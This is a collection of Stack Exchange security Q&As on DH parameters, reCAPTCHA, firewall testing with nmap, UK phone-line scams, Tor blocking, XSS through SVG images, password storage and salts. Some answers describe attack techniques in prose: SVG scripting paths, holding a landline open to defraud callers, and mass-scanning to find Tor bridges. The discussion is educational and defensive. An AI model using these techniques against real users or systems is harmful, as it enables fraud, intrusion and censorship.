<li>The DH private keys are generated in a range of size at least <em>2<sup>2k</sup></em> or so. Basically, <em>a</em> and <em>b</em> should also be <em>2k</em>-bit integers.</li>
</ul>

<p>The exact value of the generator <em>g</em> does not matter, as long as both parties use the same value. It can be shown that if someone can compute discrete logarithm relatively to a generator <em>g</em>, he can compute it as easily relatively to any generator <em>g'</em> of the same subgroup. Thus, what matters is the <em>subgroup order</em>, not the generator. You can use <em>2</em> or <em>5</em>, it won't change security.</p>

<p>Using a short generator has some (slight) benefits for performance, which is why they are preferred. The performance difference between <em>2</em> and <em>5</em> will be negligible, though. In some protocols, the generator is agreed upon at the protocol level, i.e. not transmitted over the wire; it is hardcoded in both systems. Some protocols thus mandate the use of <em>2</em>, others want to use <em>5</em>, out of historical and traditional reasons. OpenSSL, as a general-purpose library, can generate parameters for both cases.</p>

<p><strong>There are details</strong>, though. Making sure that the chosen generator indeed has an order with a big enough prime divisor can be tricky. By default, <code>openssl dhparam</code> will generate a so-called ""safe prime"", i.e. it generates random primes <em>q</em> until it find one such that <em>p = 2q+1</em> is also a prime integer. The order of any <em>g</em> modulo <em>q</em> is always a divisor of <em>p-1</em>. Thus, by using a safe prime, OpenSSL is guaranteed that the order <em>r</em> of any generator <em>g</em> in the <em>2..p-2</em> range (in particular <em>2</em> and <em>5</em>) will be equal to either <em>q</em> or <em>2q</em>, thus always a multiple of <em>q</em>, which is a big enough prime.</p>

<p>If OpenSSL generated a random <em>p</em> without making sure that it was a ""safe prime"", then the actual order of <em>g = 2</em> or <em>5</em> would be hard to compute exactly (it would involve factoring <em>p-1</em>, which is expensive).</p>

<p>In some non-DH contexts, namely the DSA signature algorithm, one must have a DH-like subgroup such that the order of the generator is <em>exactly</em> equal to a given non-too-big prime <em>q</em>, instead of merely being a multiple of <em>q</em>. In that case, OpenSSL (with the <code>-dsaparam</code> command-line switch) will first generate <em>q</em>, then <em>p = qt + 1</em> for random values of <em>t</em> until a prime is found; and the generator will be obtained by taking a random <em>s</em> modulo <em>p</em> and computing <em>g = s<sup>t</sup></em> modulo <em>p</em> (this necessarily yields either <em>1</em> or an integer of order exactly <em>q</em>). When producing DSA parameters, the generator cannot easily (or at all) be forced to be a specific small integer like <em>2</em> or <em>5</em>. For DSA, the generator is ""big"".</p>
","54367"
"What triggers Google's reCAPTCHA","18468","","<p>I noticed that Google's ""I am not a robot"" reCAPTCHA forces me to check correct images on my computer. I installed a virtual machine and tried there. Same thing. Used proxy. Same thing too. Then I used another computer in the same network (same public IP), but this time the reCAPTCHA doesn't force me to solve it. It just checks itself when I click it. </p>

<p>Very curious behaviour. I repeated the process a couple times with a few days in between, and some computers never need to solve reCAPTCHA, while others (including brand new virtual machines) behind a proxy need to. I even tried a new browser in a fresh new VM. I'm on a home network, not an enterprise network. I am confused about what triggered reCAPTCHA into thinking it needs to double check me even when using new virtual machine behind a proxy?</p>

<p>On computers where it isn't suspicious, I can delete all the cookies, history and caches, visit a website and reCAPTCHA just lets me go without any concerns. So it can't be solely based on my past activity. On the other hand, if I indeed solve the reCAPTCHA and register for an account on a website, the website is missing all the functionality for registered users.</p>

<hr>

<p>Also, when I'm presented with a CAPTCHA, even on brand new VMs, the functionality of registered users is limited. Which leads to thinking that reCAPTCHA sends information of what it thinks about a specific user to the website owner. Is this a documented behaviour? </p>
","<p>Google tries to figure out if you are a bot or not. If it's in doubt, it serves you a CAPTCHA to check. Exactly how this is done is part of Google's secret sauce, and I don't think they will tell you. But here are some ingredients I guess that they mix together:</p>

<ul>
<li><strong>Your IP:</strong> Has it been identified as a bot already? Is it a Tor exit node?</li>
<li><strong>The resources you load:</strong> A simple bot does not load styles or images, since it does not need them. That is a tell tale sign that someone is not human (or, as JDługosz points out in comments, blind).</li>
<li><strong>Sign in:</strong> Are you signed in to a Google account? Does that account appear to belong to a real person?</li>
<li><strong>Your behaviour:</strong> A human scrolls down the page, moves the mouse around, takes some time between pushing down the mouse button and releasing it. A human does not click the dead center of the check box every time. All this could be mimmicked by a good bot, but it is not easy. </li>
<li><strong>Your history:</strong> Google knows a lot of your browsing history. Bots usually don't have a browsing history.</li>
</ul>

<p>Figuring out exactly why you need to solve the CAPTCHA sometimes, but not others, is not easy. I could imagine that a fresh virtual machine has a browser fingerprint - installed fonts, plugins, etc - that is very common and therefore fishy enough for Google to flag your for a CAPTCHA. If you are behind a proxy, perhaps others have used it as well for non legit activities.</p>

<p>That you don't get a CAPTCHA when you clean your cookies is surprising. I don't understand why - then Google knows very little about you and should assume you need a CAPTCHA to be on the safe side. Perhaps they do some advanced browser fingerprinting so they still know who you are?</p>

<p>Do note that all of this is speculation. If you want more speculation, have a look at <a href=""https://stackoverflow.com/questions/27286232/how-does-new-google-recaptcha-work"">How does new Google reCAPTCHA work?</a>.</p>
","124540"
"Test firewall rules (Linux)","18409","","<p>I have a question about how to test the firewall rules. To be more specific, for academic purpose I have to set up a machine which will accept all kind of packets o a specific interface. </p>

<p>I added an IP Table rule:</p>

<pre><code>sudo iptables –A INPUT –i eth0 –j ACCEPT
</code></pre>

<p>I need a practical prove that this interface accept all kind of packets.
Does anyone know a specific way or tool which can help me.
I can't find anything better than </p>

<pre><code>nmap -p 80 &lt;ipAddress&gt;
</code></pre>

<p>or</p>

<pre><code>nmap - sU &lt;ipAddress&gt;
</code></pre>

<p>Or maybe somebody can propose a better solution to prove that the interface accepts all kind of packets.</p>
","<p>In most cases doing an <code>nmap -p 0-65535 -PN &lt;ip&gt;</code> works well for testing a remote firewall's TCP rulesets.  If you want something more advanced you can use a <a href=""http://sectools.org/tag/packet-crafters/"">packet crafter</a> like <a href=""http://www.hping.org/"">hping</a> which is designed to test firewall rulesets.  <a href=""http://wiki.hping.org/94"">Here</a> is some information on building packets with hping. </p>
","31958"
"Does hanging up on a UK landline call not terminate the connection?","18372","","<p>AgeUK (and others) <a href=""http://www.ageuk.org.uk/home-and-care/home-safety-and-security/phone-scams/dealing-with-phone-scammers/"">warn about making phone calls directly after receiving a scam call</a> and advise you to ""wait for the line to clear"":</p>

<blockquote>
  <p>Use a different phone if you can, or wait 5 to 10 minutes after the cold call if using the same phone - just in case they waited on the line.</p>
</blockquote>

<p>How does this work? Why can't the telephone network fix this?</p>

<p>Does the scammer require specialized equipment or does this work from any landline phone?</p>
","<p>To add to the original answers (and consolidate some comments):</p>

<p>Analog exchanges (certainly (*1) Strowger exchanges in the UK, probably others elsewhere) did not permit the called party to clear the line (hang up). My understanding of the original reason for this is that the calling party was paying the bill, and there was no effective signalling (pre digital exchanges) up the line (from called party to calling party) to terminate the billing. Remember on long distance calls these calls were patched through manually. This could be used (and relied on) by those receiving calls, e.g. to hang up and pick up the phone elsewhere. I believe this to be the case universally in original analog exchanges (i.e. in every country). This feature is called Called Subscriber Held (CSH).</p>

<p>When digital exchanges came in in the UK,  some people had come to rely on being able to hang up and pick up the phone elsewhere, and BT (well, the GPO as it was then) maintained this feature. All modern exchanges have a configuration knob or two (""Called Party Clear"" and ""Called Party Clear Timeout"") which determines whether, and after how long, the called party can clear the call. BT have in recent times set this knob to 3 minutes. This knob has been a feature of System X, System Y (aka Eriksson AXE10) and 21CN phone exchanges. BT use a much shorter timeout on POTS lines configured for analog PABXs. The called party can clear automatically on ISDN2 and ISDN30, and also on mobile and VoIP.</p>

<p>This is described in full in <a href=""http://www.sinet.bt.com/sinet/SINs/pdf/351v4p6.pdf"">BT SIN 351</a> (<em>""Technical Characteristics Of The Single Analogue Line Interface""</em>) under section 7.1.2:</p>

<blockquote>
  <p>7.1.2. [Call Clearing] By The Called Terminal</p>
  
  <p>When a call is ended by the called terminal, the BT network interface will detect an off-line condition (see section 3.1 Off-line d.c. Condition) and initiate a time-out process lasting between two seconds and three minutes. After the time-out period has expired, network initiated clearing (see section 7.2 Network Initiated Clearing) is provided to the calling terminal.</p>
  
  <p>Calls that are made to certain services (e.g. Number translation services and Premium rate services) are subject to first party clearing. In these circumstances, when the called terminal ends the call there is no time-out process and the calling terminal is provided with network initiated clearing (see section 7.2 Network Initiated Clearing) immediately.</p>
</blockquote>

<p>In other countries, the same knobs are available. The removal of this 'feature' (or introduction of such a safeguard) would have been up to the operator. Eire has a similar telephone network to the UK, as do various current or former British dependencies (another answerer says this is/was the case in Canada), so I would guess their incumbent operators may share the same configuration. However, various cable operators in the UK do not share this configuration. Historically, I believe this configuration has been used in the US (as <a href=""http://www.google.com/patents/US1840950"">this patent</a>) would suggest, and was present on Strowger exchanges (see <a href=""https://www.google.co.uk/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=27&amp;cad=rja&amp;uact=8&amp;ved=0CEQQFjAGOBRqFQoTCL3J8vu0-8cCFQU7FAodSRoN4A&amp;url=http%3A%2F%2Fcourse.sdu.edu.cn%2FG2S%2FeWebEditor%2Fuploadfile%2F20121213131436559.pdf&amp;usg=AFQjCNE1-s0v_lGgNuBXtF4qku2jikXsbg&amp;sig2=J_KArqAhFmdK0t-u_Oov3Q&amp;bvm=bv.102829193,d.bGg"">here</a> (PDF) and <a href=""https://books.google.co.uk/books?id=btVRxi1-JLMC&amp;pg=PA122&amp;lpg=PA122&amp;dq=%22Called%20Subscriber%20Held%22&amp;source=bl&amp;ots=s2-Kuc0NkJ&amp;sig=EFC8w74b4TBM167CM2kEmSf2Wfo&amp;hl=en&amp;sa=X&amp;ved=0CDQQ6AEwBGoVChMIz5fEorP7xwIVx28UCh1dBQbh#v=onepage&amp;q=%22Called%20Subscriber%20Held%22&amp;f=false"">here</a>).</p>

<p>In March 2014 BT announced it was drastically reducing the time for Called Party Clear. You can find the announcement <a href=""https://www.openreach.co.uk/orpg/home/updates/briefings/wholesalelinerentalbriefings/wholesalelinerentalbriefingsarticles/wlr00314.do"">here</a> (and the text quoted above is post this announcement):</p>

<p>Here are some extracts:</p>

<blockquote>
  <p>There are potential problems and the risk of fraud when the called party replaces their handset to end a call but the calling party does not. Currently, in this situation, the network will wait between 2 and 3 minutes before initiating call clearing. During this time, the calling party is still connected to the called party. If the called party picks up their handset within the timeout period, they will still be connected to the calling party. Such a feature has always been available on analogue lines to allow the called party to hang up and subsequently re-answer the call for instance when moving from one extension to another. However, this feature has of late been exploited by fraudsters who hold the line open.</p>
  
  <p>...</p>
  
  <p>It is planned to roll out the proposed changes using a phased approach across the BT network, starting with the AXE10 exchanges which equate to around one third of the local exchanges currently in service or approximately 6 million exchange lines. It is intended to commence the rollout early April to change the AXE10 configuration for call clearing to 10 seconds with a target completion date of 10 April 2014. Further information regarding the timeline for implementing the same changes to System X and UXD5 exchanges will be made available in due course.</p>
</blockquote>

<p>Note AXE10 is for this purpose a synonym to System Y. Also note AXE10 exchanges are deployed throughout Europe; the setting of this feature is (as previously indicated) a matter for the service provider.</p>

<p>So, the answers to the questions are:</p>

<blockquote>
  <p>How does this work?</p>
</blockquote>

<p>The caller waits for the called party to hang up, plays a dummy dial tone that disappears when DTMF is received, hopes the called party does not hang up for more than the relevant timeout, and after a few digits have been dialled plays a ringing tone. I imagine Asterisk is eminently suitable for this task.</p>

<blockquote>
  <p>Why can't the telephone network fix this?</p>
</blockquote>

<p>They can, and in the case of BT are fixing it. Other operators may not need to fix it as they may not offer this 'back compatible' feature.</p>

<blockquote>
  <p>Does the scammer require specialized equipment or does this work from any landline phone?</p>
</blockquote>

<p>You do not need specialised equipment. However, you do need to dial someone who is on a landline configured for it, and hope they hang up for less than the relevant delay. May people may hang up for less than 10 seconds (which is the new standard it would appear).</p>

<p>Note this technique is not only much loved by fraudsters, but (when the delay was longer) was often used by journalists who, having contacted someone for a 'scoop', would leave the phone off the hook to prevent their competitors phoning the same person whilst they raced around to do an interview.</p>

<p>*1 = it has been suggested that even Strowger exchanges supported this, evidence of which I would be interested in. My research (see <a href=""https://www.google.co.uk/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=27&amp;cad=rja&amp;uact=8&amp;ved=0CEQQFjAGOBRqFQoTCL3J8vu0-8cCFQU7FAodSRoN4A&amp;url=http%3A%2F%2Fcourse.sdu.edu.cn%2FG2S%2FeWebEditor%2Fuploadfile%2F20121213131436559.pdf&amp;usg=AFQjCNE1-s0v_lGgNuBXtF4qku2jikXsbg&amp;sig2=J_KArqAhFmdK0t-u_Oov3Q&amp;bvm=bv.102829193,d.bGg"">here</a>) suggests that in the original Strowger configuration, it merely lit an alarm lamp. Even if this is correct, this is not to detract from the fact that at least some earlier exchanges did not disconnect for a considerable time after the called party hang up.</p>
","100342"
"Is it good or bad practice to allow a user to change their username?","18370","","<p>I have looked all over online as well as this site to try to find out more information regarding the security of this, but haven't found anything. In my particular case, the product is a website, but I think this question applies for any software that hosts a large number of users.</p>

<p>I know there are numerous websites out there that allow you to change your username, but at the same time there are many that do not allow it. I'm sure some that do not allow it may be just for simplicity, but possibly for security as well.</p>

<p>My question is just like the title asks:</p>

<p><strong>From a security standpoint, would you say it is good or bad practice to allow individuals to change their username?</strong></p>

<p>I currently cannot think of any reason not to allow it, given it is done properly (ie make it impossible for duplicate usernames, require inputting current password to make sure password requirements are still met regarding not containing username, etc), but I can't help but think there's something I'm missing.</p>

<p>I know there are advantages from the user's perspective to allow them to change their username. An example would be if they set their username to their email address and decide to use a different email address later. Instead, I'm curious of the benefits vs risks regarding the security of the application and login process if you allow them to change their username.</p>

<p><strong>EDIT:</strong></p>

<p>Some of the answers bring up good points regarding publicly-displayed names, but to clarify, the question is not regarding any public display name, but instead the unique username used to log in.</p>
","<p>Many people have looked at the reasons not to allow name changes from both a security and a community standpoint. However, there are plenty of legitimate reasons to allow username changes, <em>even if the username is separate from the display name</em>, for example:</p>

<ul>
<li>Someone has changed their real life name or the name by which they'd prefer to be called, due to marriage, family situations, escaping stalking/harassment/etc., and so on

<blockquote>
  <p>Even in the case of it being simply a username, having to use an old name which carries trauma can further the trauma. Also, it is quite possible for a stalker/harasser to know their target's login credentials, and being able to change both parts of the credential lowers the attack surface; further, monitoring attempts at logging in to an abandoned username allows for building a legal case against a bad agent.</p>
</blockquote></li>
<li>People have decided to move forward on a gender transition

<blockquote>
  <p>Being forced to use one's ""dead name,"" even in the context of a private username, is also very traumatic. (I can speak to personal experience on this one.)</p>
</blockquote></li>
<li>People have a username that they no longer feel suits them for whatever reason

<blockquote>
  <p>This has less of an implication for internal usernames but it's still better to err on the side of kindness, in my opinion.</p>
</blockquote></li>
</ul>

<p>These are all important for user comfort, and in many cases people would likely just create a new account with the new name anyway, so might as well support it.</p>

<p>Avoiding social engineering certainly is important but there are approaches that help to mitigate this, such as various forms of verification (as seen on several social networks), public-key cryptography, and profile indicators (""name last changed N months ago; name changed K times""). And, since this question has been edited to be regarding internal user names and not public display names, those concerns aren't even germane to the discussion.</p>

<p>Also, keep in mind that many attack surfaces provided by someone changing their username is also present for someone simply creating a new account, and if a username change option is not available then the user will likely create a new account - possibly using the same password as the old one and otherwise doing things that might lead to compromised security.</p>

<p>It is a good idea to maintain an audit trail of username changes and disallow the creation of new accounts that use a previously-used username (at least if the username was last used within the past, say, year), but there is no reason that the username should ever be the primary key used to associate data with the user account in the first place, because there are legitimate purposes for a username change and all account records should be normalized to an abstract internal-only ID in the first place.</p>
","175832"
"Automated tools for Cisco IOS config auditing?","18321","","<p>Are there any automated tools for auditing config files exported from Cisco IOS devices?  Free/Open Source is always nice, but anything that does the job would be of interest.</p>
","<p>Cisco's own <a href=""http://www.cisco.com/en/US/products/sw/secursw/ps5318/"" rel=""nofollow"">SDM</a> (Security Device Manager) performs some <a href=""http://www.cisco.com/en/US/prod/collateral/routers/ps5318/product_data_sheet0900aecd800fd118.html"" rel=""nofollow"">basic auditing</a>.  ""Cisco SDM allows users to perform one-step security audits to evaluate the strengths and weaknesses of their router configurations against common security vulnerabilities.""  For a list of features included, see <a href=""http://www.cisco.com/en/US/docs/routers/access/cisco_router_and_security_device_manager/25/software/user/guide/SAudt.html#wp1061799"" rel=""nofollow"">AutoSecure Features Implemented in Cisco SDM</a> .</p>

<p>Another well-known tool is <a href=""http://cisecurity.org/en-us/?route=downloads.browse.category.tools.rat"" rel=""nofollow"">Cisco RAT</a>, available from the Center for Internet Security. </p>

<p>These are good starting points, but far from perfect. </p>

<p>A more recent option (which I haven't tried yet) is the Nessus IOS plugin from <a href=""http://blog.tenablesecurity.com/2010/06/cisco-compliance-checks.html"" rel=""nofollow"">Tenable</a>.</p>

<p>More ad hoc (single-function) tools can be found at </p>

<p><a href=""http://packetstormsecurity.org/cisco/page1/"" rel=""nofollow"">http://packetstormsecurity.org/cisco/page1/</a><br>
and<br>
<a href=""http://www.cymru.com/Tools/index.html"" rel=""nofollow"">http://www.cymru.com/Tools/index.html</a></p>
","1984"
"Why would someone ""double encrypt""?","18314","","<p>If I have a website or mobile app, that speaks to the server through a secured SSL/TLS connection (i.e. HTTPS), and also encrypt the messages sent and received in-between user and server on top of the already secure connection, will I be doing unnecessary moves? Or is double-encryption a common method? If so, why?</p>
","<p>It's not uncommon, but it may not be required. A lot of developers seem to forget that HTTPS traffic is already encrypted - just look at the number of questions about implementing client side encryption on this website - or feel that it can't be trusted due to well-publicised issues such as the <a href=""https://en.wikipedia.org/wiki/Superfish"">Lenovo SSL MitM mess</a>.</p>

<p>However, most people weren't affected by this, and there aren't any particularly viable attacks against TLSv1.2 around at the moment, so it doesn't really add much.</p>

<p>On the other hand, there are legitimate reasons for encrypting data before transmission in some cases. For example, if you're developing a storage application, you might want to encrypt using an app on the client side with a key known only to the user - this would mean that the server would not be able to decrypt the data at all, but it could still store it. Sending over HTTPS would mean that an attacker also shouldn't be able to grab the client-encrypted data, but even if they did, it wouldn't matter. This pattern is often used by cloud based password managers.</p>

<p>Essentially, it depends on what you're defending against - if you don't trust SSL/TLS, though, you probably can't trust the encryption code you're sending (in the web application case) either!</p>
","117479"
"How would a resourceful government block Tor?","18310","","<p>I came across <a href=""http://thehackernews.com/2015/12/France-tor-ban.html"">this article</a> saying that after <a href=""https://en.wikipedia.org/wiki/November_2015_Paris_attacks"">the November 2015 Paris attacks</a>, some French police officers proposed to ban Tor.</p>

<p>Tor is used to circumvent censorship! What security techniques would governments use to block Tor?</p>
","<p>In order to block Tor all that has to be done is have the current list of Tor nodes which can be found at the following link:</p>

<p><a href=""http://torstatus.blutmagie.de/ip_list_all.php/Tor_ip_list_ALL.csv"" rel=""noreferrer"">http://torstatus.blutmagie.de/ip_list_all.php/Tor_ip_list_ALL.csv</a></p>

<p>and then block them bidirectionally via the Routers or Firewalls. </p>

<p>That said there will be numerous ways around such efforts, people can still use VPN's to connect outside of a given area and then run the Tor traffic from another location or tunnel the traffic through, but this will effectively block many of the less technical people from accessing Tor.</p>

<p>Similarly the following list of Tor exit nodes could be useful for blocking Tor traffic from connecting to any given websites:
<a href=""https://check.torproject.org/exit-addresses"" rel=""noreferrer"">https://check.torproject.org/exit-addresses</a></p>

<p>I would say it's easy to make Tor hard to use but that it's extremely hard to make it impossible to use. </p>

<p>Keep in mind that governments with large financial resources can spend money to run tools like <a href=""https://zmap.io"" rel=""noreferrer"">ZMAP.io</a> to find potential Tor servers, including Tor Bridges, minutes after they are started. Continuously scanning the entire IPv4 address space has become trivial for those with even a small budget so a campaign to find and block Tor nodes could easily be very effective, but it will never be absolute. </p>

<p>Finally keep in mind that once Tor users have been identified the government would likely monitor future connections by that user to locate new Tor bridges, or similar connections.</p>

<p>Note: The task of scanning IPv4 has become trivial but the process for scanning all of the public IPv6 address space would be radically unmanageable due to the scale. That said a large government project correlating other types of data such as netflow, some type of traffic signatures, or some other form of identification would be required to identify and block Tor traffic on IPv6 networks. </p>

<p>Again governments can make Tor hard to use but that it's extremely hard to make it impossible to use.</p>

<p>It should be further noted that governments also leverage additional tactics to identify anonymous users. To protect end users from risks related to cookies or other signatures which may give away additional information about Tor users it may be wise to use an anonymous live CD such as the following:</p>

<p><a href=""https://www.whonix.org/"" rel=""noreferrer"">https://www.whonix.org/</a></p>

<p><a href=""https://tails.boum.org/"" rel=""noreferrer"">https://tails.boum.org/</a></p>

<p>Torflow visualization may also be of interest:</p>

<p><a href=""https://torflow.uncharted.software"" rel=""noreferrer"">https://torflow.uncharted.software</a></p>

<p>Related article: 81% of Tor Users Can be Easily Unmasked By Analyzing Router Information</p>

<p><a href=""http://thehackernews.com/2014/11/81-of-tor-users-can-be-easily-unmasked_18.html"" rel=""noreferrer"">http://thehackernews.com/2014/11/81-of-tor-users-can-be-easily-unmasked_18.html</a></p>

<p>Another related article about a much more dangerous but related issue: Tor Browser Exposed</p>

<p><a href=""https://hackernoon.com/tor-browser-exposed-anti-privacy-implantation-at-mass-scale-bd68e9eb1e95"" rel=""noreferrer"">https://hackernoon.com/tor-browser-exposed-anti-privacy-implantation-at-mass-scale-bd68e9eb1e95</a></p>
","107491"
"What could an ""<img src="" XSS do?","18259","","<p>Most WAFs when blocking XSS will block obvious tags like <code>script</code> and <code>iframe</code>, but they don't block <code>img</code>.</p>

<p>Theoretically, you can <code>img src='OFFSITE URL'</code>, but what's the worse that can happen? I know you can steal IPs with it, but is that it?</p>
","<p>Like <a href=""https://security.stackexchange.com/users/98538/anders"">Anders</a> says: <a href=""https://security.stackexchange.com/users/24001/blender"">Blender</a> makes a very good point about authentications dialogs, and <a href=""https://security.stackexchange.com/users/90657/korockinout13"">korockinout13</a> is right about the on attributes.  Moreover, Aders add argues about the <code>a</code> tag and <a href=""https://security.stackexchange.com/users/32877/matija-nalis"">Matija</a> have a good link about exploiting libraries doing the rendering.</p>

<p><strong>Yet, no one talked about SVG yet.</strong></p>

<p>First of all let's assume that all input and output is properly sanitized so tricks with <code>onerror</code>/<code>onload</code> are not possible.  And that we are not interested in CSRF.  We are after XSS.</p>

<p>The first concern about <code>&lt;img src=</code> is that it does not follow same origin policy.  But that is probably less dangerous than it sounds.</p>

<h3>What the browser does to render an &lt; img > tag</h3>

<p><code>&lt; img src=""http://domain/image.png"" &gt;</code> is pretty safe because the browser will not invoke a parser (e.g. an XML or HTML parser), it knows that what will come is an image (gif, jpeg, png).</p>

<p>The browser will perform the HTTP request, and it will simply read the MIME of what came (in the <code>Conetent-Type</code> header, e.g. <code>image/png</code>).  If the answer does not have a <code>Content-Type</code> several browsers will guess based on the extension, yet they will only guess image MIMEs: <code>image/jpeg</code>, <code>image/png</code> or <code>image/gif</code> (tiff, bmp and ppm are dubious, some browsers may have a limited support to guess them).  Some browsers may even try to guess the image format based on magic numbers, but then again they will not try to guess esoteric formats.</p>

<p>If the browser can match the (possibly guessed) MIME it loads the correct rendering library, rendering libraries may have an overflow but that is another story.  If the MIME does not match against an image rendering library the image is discarded.  If the rendering library call fails the image is discarded as well.</p>

<p>The browser is never even close to an execution (script) context.  Most browsers enter execution context only from the javascript parser, and they can only reach the javascript parser from the <code>application/javascript</code> MIME or from the XML or the HTML parsers (since they may have embedded scripts).</p>

<p>To perform XSS we need an execution context.  Enters SVG.</p>

<h3>Using &lt; img src=""domain/blah/blah/tricky.svg"" ></h3>

<p>Ouch, ouch ouch.  SVG is an XML based vector graphic format, therefore it invokes the XML parser in the browser.  Moreover SVG has the <code>&lt;script&gt;</code> tag!  Yes, you can embed javascript directly into SVG.</p>

<p>This is not as dangerous as it sounds at first.  <a href=""https://www.w3.org/Graphics/SVG/IG/resources/svgprimer.html#SVG_image"" rel=""noreferrer"">Browsers that support SVG inside <code>&lt;img&gt;</code> tags do not support scripting inside the context</a>.  Ideally you should use SVG inside <code>&lt;embed&gt;</code> or <code>&lt;object&gt;</code> tags where scripting is supported by browsers.  Yet, do not do it for user provided content!</p>

<p>I would argue that allowing SVG inside <code>&lt;img src=</code> <strong>may</strong> be dangerous:</p>

<ul>
<li><p>An XML parser is used to parse the SVG, whether it is inside the <code>&lt;img&gt;</code> or <code>&lt;object&gt;</code> tag.  The parser is certainly tweaked with some parameters to ignore <code>&lt;script&gt;</code> tags in the <code>&lt;img&gt;</code> context.  Yet, that is quite ugly, it is blacklisting a tag in a certain context.  And blacklisting is poor security.</p></li>
<li><p><code>&lt;script&gt;</code> is not the only way to achieve execution context in SVG, there are also the <code>onmouseover</code> (and family) events present in SVG.  This is again tricky to blacklist.</p></li>
<li><p>The XML parser in browsers did suffer from problems in the past, notable with XML comments around script blocks.  SVG may present similar problems.</p></li>
<li><p>SVG has full support for XML namespaces.  Ouch again.  <code>xlink:href</code> is a completely valid construct in SVG and the browser inside the XML parser context will likely follow it.</p></li>
</ul>

<p>Therefore yes, SVG opens several possible vectors to achieve execution context.  And moreover, it is a relatively new technology and therefore not well hardened.  I would not be surprised to see CVEs on SVG handling.  For example <a href=""https://imagetragick.com/"" rel=""noreferrer"">ImageMagick had problems with SVG</a>.</p>
","135636"
"Is it safe to store password in HTML5 sessionStorage?","18239","","<p>I am trying to improve the user experience on registration by not requiring the user to retype their password if validation on other fields fail. There are a few ways to implement this, example using session cookie and storing a hash of the password on the server side. I am exploring this alternative of storing user password temporarily on the client side without having the server to keep track of it. Is this method feasible? What are the risks involved?</p>
","<p>In principle, values stored in sessionStorage are restricted to the same scheme + hostname + unique port, and if the browser has a clean exit these values should be deleted at the end of the session. However, according to <a href=""http://htmlui.com/blog/2011-08-23-5-obscure-facts-about-html5-localstorage.html"" rel=""nofollow"">this post</a> it can survive a browser restart if the user chooses to ""restore the session"" after a crash (which means its values also exist in persistent memory until they are cleared, so keep that in mind). If well implemented, I'd say it's safe enough - especially compared to your alternative of using a cookie (which has many pitfalls that I wouldn't even consider). The W3C Specification also states that Web Storage <a href=""https://html.spec.whatwg.org/multipage/webstorage.html#sensitivity-of-data"" rel=""nofollow"">might indeed be used to store sensitive data</a> (though it's unclear whether or not that practice is endorsed).</p>

<p>As for the risks, it's simply a matter of tradeoffs: you're making your site a little more convenient for your users, while increasing a little the window of opportunity for the password to be captured (either by means of a XSS vulnerability, by the value persisting in persistent storage for longer than you intended to, or by the user leaving the computer unattended before finishing registration). Ideally, passwords should never leave RAM, but that's usually impractical to do, so some compromise is necessary. I'd just advise to clear the password from sessionStorage as soon as the registration succeeds, and to keep an eye for vulnerabilities on sessionStorage implementations that may eventually come to light.</p>
","36962"
"How Does A Random Salt Work?","18217","","<p>I don't understand how using a random salt for hashing passwords can work.  Perhaps random salt refers to something other than hashing passwords?  Here is my thought process:</p>

<ol>
<li><p>The salt is used to add extra junk to the end of a password prior to hashing it, to fight against the likelihood of being cracked by a rainbow table</p></li>
<li><p>However to ensure you can still verify a password is correct, you must use the same salt for each password prior to encrypting it to see if it matches the hash saved for a certain user</p></li>
<li><p>If a random salt is used, how can that password ever be verified again?  Is the random salt saved somewhere to be used for each encryption?  Seems less secure to me if the salt is saved right alongside the hashed password, rather than using some kind of computed salt an attacker would not inherently know if they got a hold of your data.</p></li>
</ol>

<p>I'm not sure if I'm missing something here, or if random salting has to do with a different scenario in encryption, and doesn't make sense in this particular case.  How can a random salt work in the above case of hashing passwords prior to encrypting?</p>
","<blockquote>
  <p>Is the random salt saved somewhere to be used for each encryption?</p>
</blockquote>

<p>Yes</p>

<blockquote>
  <p>Seems less secure to me if the salt is saved right alongside the hashed password, rather than using some kind of computed salt an attacker would not inherently know if they got a hold of your data.</p>
</blockquote>

<p>It's not, because the only thing a salt does and was invented to do is, as you said:</p>

<blockquote>
  <p>to fight against the likelyhood of being cracked by a rainbow table</p>
</blockquote>

<p>and nothing more. It adds complexity to a single password - and for every password in a database, it is unique. To verify the password, you need to store it alongside it. This doesn't compromise the security of that single password in the least bit - the hash algorithm is still as secure as without a salt.</p>

<p>But, looking at the whole database, every password is better protected against rainbow attacks, because the attacker must calculate very single hash with the respective salt separately and cannot do bulk operations on them.</p>
","66990"
"HTTPS web service switched to HTTP. What can go wrong?","18204","","<p>I recently visited a website which used to have an HTTPS connection. Now it has just a plain HTTP connection, and the authentication method has changed from user+password to ""authenticate with Google account"".</p>

<p>I contacted them and asked them why they dropped the HTTPS, and they told me ""because now the authentication is secure with Google, so it is not necessary anymore"".</p>

<p>Well, I am not an expert in security, but before replying to them, I would like to know: what could go wrong?</p>

<p>So, with my little knowledge, I would say (correct me if I am wrong):</p>

<ul>
<li>Privacy loss in the communications between client and server (the attacker can read any information exchanged, and that includes personal information that the client may be posting to the server).</li>
<li>An attacker could modify the client's requests, maybe with malicious intentions.</li>
<li>An attacker could read the cookie and use it to get access to the service as if they were the client that originally authenticated using Google's services.</li>
</ul>

<p>Am I right? What else could go wrong?</p>
","<p><strong>You are right, the regression to HTTP is pointless.</strong></p>

<p>Note that all your points apply to one particular kind of attack, where the adversary is able to access the data transport between client and server. That could be the owner of a WiFi hotspot or your ISP acting as a <a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack""><strong>man-in-the-middle</strong></a>, who sits in between you and the server. <em>This can be hard to accomplish for a remote attacker, but is particularly easy on a public WiFi.</em></p>

<p>What <strong>HTTPS</strong> adds to HTTP is <strong>secure data transport</strong>. The web application itself can be completely fine - if you are communicating over an unencrypted channel, the attacker will be able to read, modify and inject arbitrary data into your requests and the server responses. With a captured session cookie, it will also be possible to impersonate you for as long as the cookie is valid.</p>

<p>What the attacker <em>cannot</em> do is take over your Google account or reauthenticate with Google at a later point. This is because the authentication with Google always happens over SSL and the granted token expires after a given time.</p>

<p>So the situation is somewhat better than capturing your credentials straight away. However, as you said, an attacker would still be able to take over the session and perform any action on your behalf.</p>
","120864"
"How do organizations check *what* has been hacked?","18179","","<p>In the UK, the company <a href=""http://www.bbc.co.uk/news/uk-34611857"">TalkTalk was recently hacked</a>. </p>

<p>It was later discovered, after 'investigation' that the hack was not as serious as it could have been (and less than expected).</p>

<p>I'm wondering: How do organizations (not necessarily TalkTalk -- that's just what prompted me to ask) check <em>what</em> has been hacked? I'm sure there are many ways; but what are the 'main' ones?</p>
","<p>In a word: <strong>Forensics</strong>.</p>

